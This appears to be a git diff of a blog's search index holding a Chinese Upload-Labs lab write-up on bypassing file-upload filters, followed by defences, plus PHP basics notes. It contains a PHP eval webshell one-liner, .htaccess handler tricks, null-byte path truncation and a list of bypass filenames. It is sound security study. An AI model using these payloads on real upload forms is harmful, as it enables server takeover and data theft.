+Pass - 09（黑名单验证，结合绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+全部都限制了，代码从上往下都执行一下，也就是去.和去空格也是去一下，那么我们多写几个试一下
+
+使用. .绕过
+Pass - 10（黑名单验证·双写绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#x27;上传出错！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 把file_name中含有deny_ext的那段字符替换成空
+选择双写绕过
+文件名写为shell.pphphp 在上传时，中间的php被替换为了空，然后前面的p和后面的hp 拼接成了php依旧绕过
+Pass - 11（GET 参数 %00 截断）Pass-11 的保存路径来自 GET 参数：
+$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+历史 PHP 环境中可以尝试使用空字节截断：
+POST /Pass-11/index.php?save_path=../upload/shell.php%00
+
+如果环境拒绝空字节，通常会返回上传失败；这取决于 PHP、Apache 和底层文件系统版本。
+Pass - 12（POST 参数 %00 截断）Pass-12 与上一关逻辑相同，但保存路径来自 POST 参数：
+实际页面表单使用隐藏的 POST 参数：
+&lt;input type=&quot;hidden&quot; name=&quot;save_path&quot; value=&quot;../upload/&quot;/&gt;
+
+后端仍然把用户可控的路径和系统生成的文件名拼接起来：
+$img_path = $_POST[&quot;save_path&quot;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+因此在兼容的历史环境中，可以把 save_path 改为带 %00 的路径，例如：
+?save_path=../upload/shell.php%00
+
+如果 PHP 版本足够老且允许空字节截断，拼接后的随机 .jpg 部分可能会被截断，最终写入 shell.php。你当前的 PHP 5.2.17 容器实际测试仍保存成了 .jpg，说明还受到 Web 服务器和请求解析方式影响。Pass-12 的核心问题是：保存目录不应由用户直接控制。
+Pass - 13（文件头检测）Pass-13 读取上传文件的前两个字节判断图片类型：
+function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2);    fclose($file);    // 根据前两个字节识别 jpg、png、gif&#125;
+
+程序只检查文件头，不检查完整图片结构，也不信任用户原始扩展名，而是根据识别结果重新生成 .jpg、.png 或 .gif 文件名。该关的学习重点是文件头检测；若要观察图片内容中的脚本，需要结合题目提供的文件包含漏洞。
+Pass - 14（getimagesize 检测）Pass-14 使用 getimagesize() 判断上传文件是否能被识别为图片：
+$info = getimagesize($filename);$ext = image_type_to_extension($info[2]);
+
+相比只检查文件头，getimagesize() 会进一步解析图片结构。通过后，程序根据识别结果重新生成扩展名，而不是直接采用用户提交的后缀。
+这类检测仍然不是完整的安全方案，因为它只验证图片格式，不会验证文件中是否包含额外内容。Pass-14 同样要求结合题目提供的文件包含漏洞观察图片内容；直接访问上传文件并不会让 Apache 自动执行图片中的 PHP 代码。
+代码中还存在一个值得注意的实现问题：
+if(stripos($types,$ext)&gt;=0)
+
+stripos() 找不到字符串时返回 false，而 false 与 0 比较时容易产生逻辑混淆。更严谨的写法应使用严格比较，并使用数组白名单。
+Pass - 15（EXIF 图片类型检测）Pass-15 使用 exif_imagetype() 判断图片类型：
+$image_type = exif_imagetype($filename);
+
+程序只接受：
+IMAGETYPE_GIFIMAGETYPE_JPEGIMAGETYPE_PNG
+
+然后将文件重命名为随机名称并使用对应扩展名。相比客户端 MIME 和文件名后缀，EXIF 类型检测更依赖文件实际内容，但它仍然只是图片格式检测，并不能证明文件是安全的图片。
+这一关需要 PHP 的 exif 扩展；如果扩展未启用，exif_imagetype() 可能不可用。实际部署中应同时限制上传目录禁止脚本执行，并将上传文件存放在 Web 根目录之外。
+Pass - 16（二次渲染）Pass-16 会先按文件类型读取图片，然后重新生成一张图片：
+$im = imagecreatefromjpeg($target_path);imagejpeg($im, $img_path);@unlink($target_path);
+
+PNG 和 GIF 也有对应处理。原始上传文件会被删除，最终只保留 GD 库重新编码后的图片。
+这种方式称为二次渲染或图片重编码。它会丢弃原文件中未参与图片结构的数据，通常可以破坏附加在图片末尾的脚本内容，因此比单纯检查文件头更严格。
+要通过这一关，文件必须是真实且能被 GD 正常解析的图片；仅仅在普通文本前面添加图片头通常会在 imagecreatefrom*() 处失败。二次渲染后的文件仍应放在禁止脚本执行的目录中。
+Pass - 17（先保存后校验，条件竞争）Pass-17 的顺序存在明显问题：
+move_uploaded_file($temp_file, $upload_file);if(in_array($file_ext, $ext_arr))&#123;    rename($upload_file, $img_path);&#125;else&#123;    unlink($upload_file);&#125;
+
+程序先把文件写入上传目录，再检查后缀。非法文件会随后删除，但在“写入”和“删除”之间存在短暂窗口，这属于竞态条件（TOCTOU）问题。
+理论上，如果另一个请求能在这段时间访问该文件，就可能在删除前读取它；实际是否可观察到取决于服务器速度、并发和文件系统，通常需要大量并发请求，结果也不稳定。
+这关的安全重点是校验顺序：应先完成类型、内容和权限校验，确认安全后再写入最终目录；不要把不可信文件先放进可访问的 Web 目录。
+Pass - 18（上传类的白名单校验）Pass-18 使用 MyUpload 类处理文件上传。核心校验包括：
+in_array(strtolower(strrchr($this-&gt;cls_filename, &quot;.&quot;)),         $this-&gt;cls_arr_ext_accepted)
+
+允许的扩展名是一个白名单，包含图片、文档和压缩文件等类型；.php 不在白名单中。类还会检查：
+
+是否确实是上传的临时文件；
+上传目录是否可写；
+文件扩展名是否允许；
+文件大小是否超过限制；
+移动文件是否成功；
+是否需要重命名文件。
+
+Pass-18 的关键是白名单校验比黑名单更可靠，但扩展名白名单仍不能替代文件内容检测。允许上传的 HTML、XML、压缩包等文件也可能带来其他风险，因此生产环境应只允许业务真正需要的类型。
+Pass - 19（保存文件名可控）8089 中 Pass-19 允许客户端通过 save_name 指定最终文件名，并用 pathinfo() 检查后缀：
+$file_name = $_POST[&#x27;save_name&#x27;];$file_ext = pathinfo($file_name, PATHINFO_EXTENSION);if (!in_array($file_ext, $deny_ext)) &#123;    move_uploaded_file($temp_file, UPLOAD_PATH . &#x27;/&#x27; . $file_name);&#125;
+
+源码注释掉了原本的清理逻辑，因此存在大小写、路径和文件名控制问题。能否执行仍取决于 Apache&#x2F;PHP 的解析配置；上传成功不等于 PHP 会执行。
+Pass - 20（数组参数绕过）Pass-20 同时校验上传 MIME、保存文件名后缀，并支持数组形式的 save_name：
+$allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);$file = empty($_POST[&#x27;save_name&#x27;])    ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]    : $_POST[&#x27;save_name&#x27;];if (!is_array($file)) &#123;    $file = explode(&#x27;.&#x27;, strtolower($file));&#125;$ext = end($file);$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);if (in_array($ext, $allow_suffix)) &#123;    $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];    move_uploaded_file($temp_file, UPLOAD_PATH . &#x27;/&#x27; . $file_name);&#125;
+
+关键点是：普通字符串会先经过 strtolower() 和 explode()，但如果提交的 save_name 是数组，代码会跳过 explode()。随后 end()、reset() 和数组下标操作分别参与后缀判断和最终文件名拼接，因此这是一个 PHP 数组参数类型混淆问题。
+这一关还检查了客户端提交的 MIME 类型；MIME 值本身可被修改，所以不能作为唯一的安全依据。最终文件名仍应使用服务器端生成的安全名称，并结合真实图片内容检测。
+总结文件上传漏洞可能导致：
+
+上传恶意脚本，进一步造成服务器代码执行；
+获取服务器控制权，执行系统命令；
+读取、修改或删除服务器上的敏感文件；
+窃取数据库账号、用户信息和配置文件；
+上传钓鱼页面或恶意文件，影响其他用户；
+覆盖系统文件，造成网站篡改或服务中断；
+利用超大文件或大量文件消耗服务器存储和资源。
+
+防御方法
+
+在服务端使用白名单，只允许业务需要的文件类型；
+验证真实文件内容，不能只相信扩展名或 MIME 类型；
+由服务器随机生成文件名，禁止用户控制保存路径；
+将上传目录放在 Web 根目录之外，或禁止脚本执行；
+限制文件大小、数量和上传频率；
+对图片进行重新编码或二次渲染；
+先完成校验，再保存到最终目录，避免条件竞争；
+下载文件时设置正确的响应头，防止浏览器执行恶意内容；
+对上传行为记录日志并进行病毒或恶意文件检测。
+
+核心原则是：不信任客户端提供的信息，并确保上传文件即使被成功保存，也不能被服务器当作代码执行。
+加后缀file.Php   大小写绕过file.php::$DATAfile.Phpfile.php+file.php.   （多少个 . 都可以）file.php%80-90file.php+file.php.+.+黑名单替换绕过.phphp pfile.pphphp定义不全php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml文件幻术GIF89a?
+]]></content>
+      <categories>
+        <category>web安全学习</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+        <tag>Upload-Labs</tag>
+        <tag>Web安全</tag>
+      </tags>
   </entry>
   <entry>
     <title>SQL注入学习：基础原理与 SQLi-Labs 练习</title>
@@ -772,205 +699,628 @@ Less - 10时间盲注，闭合方式和9不一样而已
         <category>web安全学习</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>SQL注入</tag>
         <tag>MySQL</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
-    <title>文件上传安全：Upload-Labs 绕过思路与防御</title>
-    <url>/2026/11/02/file-upload-security/</url>
-    <content><![CDATA[本文为 Upload-Labs 本地靶场学习记录，示例仅用于自建或明确授权的测试环境。生产系统应采用严格白名单、服务端内容校验，并将上传文件存放在不可执行目录。
+    <title>PHP学习笔记：类型比较、超全局变量与面向对象</title>
+    <url>/2026/10/28/php-learning/</url>
+    <content><![CDATA[本文记录 PHP 基础语法、弱类型比较、超全局变量与常见函数，并通过类、对象、构造方法和继承入门面向对象。
 
 
-1.一句话木马&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;
+学习地址
+基础语法PHP 脚本在服务器上执行，然后将纯 HTML 结果发送回浏览器
+PHP代码的基本格式
+&lt;?php//PHP代码?&gt;
 
-通过upload-labs学习文件上传绕过手法
-upload-labsPass - 01（前端校验绕过）方法一：禁用js上传a.php 发现了弹窗，可以想到禁用js代码，禁用js之后上传成功
+PHP变量
+变量以 $ 符号开始，后面跟着变量的名称
 
-方法二：删除前端校验函数
-Pass - 02（MIME类型验证绕过）这里发现删除前端校验的函数发现没用了，那肯定是服务端校验了
-这里还是直接上传a.php 提示上传的文件类型不正确
+变量名必须以字母或者下划线字符开始
 
-查看源码分析一下
-$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）
 
-上传文件的type必须为image/jepg image/png image/gif
-用bp抓一下包，把content-type改为需要的类型
+变量名不能包含空格
 
-
-放包之后得到了一个图片，上传成功
-
-Pass - 03（特殊后缀黑名单绕过）
-这里看到是限制了这类的后缀文件，尝试使用其他可被解析的后缀名
-
-双重后缀：shell.php.jpg、shell.jpg.php（取决于解析规则）
-
-PHP 其他后缀： .php3, .php4, .php5, .phtml,.phar等（需要服务器配置支持）。
-
-大小写混淆： .Php, .pHp（适用于黑名单校验为小写，但系统本身不区分大小写的Windows服务器）
-
-URL 编码：shell%2ephp、双重编码（取决于解码顺序）
+变量名是区分大小写的（$y 和 $Y 是两个不同的变量）
+这些和其他语言的差别不大
 
 
-这里尝试了.php3, .php4, .php5, .phtml,.phar全部都可以绕过
-查看一下源码是什么样子的
-$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+&lt;?php$x=5;  //给x赋值$y=6;  // $给变量赋值 $z=$x+$y;echo $z;?&gt;
 
-可以看到大小写是绕不过去的,末尾点、空格、::$DATA 不可行
-Pass - 04（.htaccess 文件攻击）查看源代码，基本什么都被显示了
-$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传!&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+PHP 是一门弱类型语言
+这是什么意思那，就是不必向 PHP 声明该变量的数据类型，和C语言对比，比如c语言定义一个整型变量需要int a; 但是在PHP中就不需要，PHP 会根据变量的值，自动把变量转换为正确的数据类型。
+PHP数据类型和比较
+String（字符串）
 
-.htaccess 是 Apache Web 服务器的目录级配置文件。
-它可以影响当前目录及子目录的行为，例如：
+Integer（整型）
 
-重写 URL
-设置访问权限
-配置默认首页
-设置错误页面
-控制缓存
-指定某些文件的处理方式
+Float（浮点型）
 
-AddHandler php5-script .jpg AddType application/x-httpd-php .jpg Sethandler application/x-httpd-php
+Boolean（布尔型）
 
-Sethandler 将该目录及子目录的所有文件均映射为php文件类型。Addhandler 使用 php5-script 处理器来解析所匹配到的文件。AddType 将特定扩展名文件映射为php文件类型。
-简单来说就是，可以将我们所的文件都解析成php或者是特定的文件解析为php
-&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;
+Array（数组）
 
-然后上传shell.jpg,访问上传的图片
+Object（对象）
 
-Pass - 05（大小写转换绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+NULL（空值）
 
-没有大小写验证，直接上传shell.PHP
-Pass - 06（黑名单验证空格绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file,$img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;
+Resource（资源类型）
+数组这里array() 和其他语言不太一样，重点学习一下
 
-没有末尾去除空格的函数，抓包改一下名字，就能绕过
 
-Pass - 07（黑名单末尾点绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt;
 
-没有去除末尾.的函数，直接绕过
-抓包修改包名，和上一题一样，空格换成.就行
 
-Pass - 08（黑名单验证，特殊字符::$DATA绕过）$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot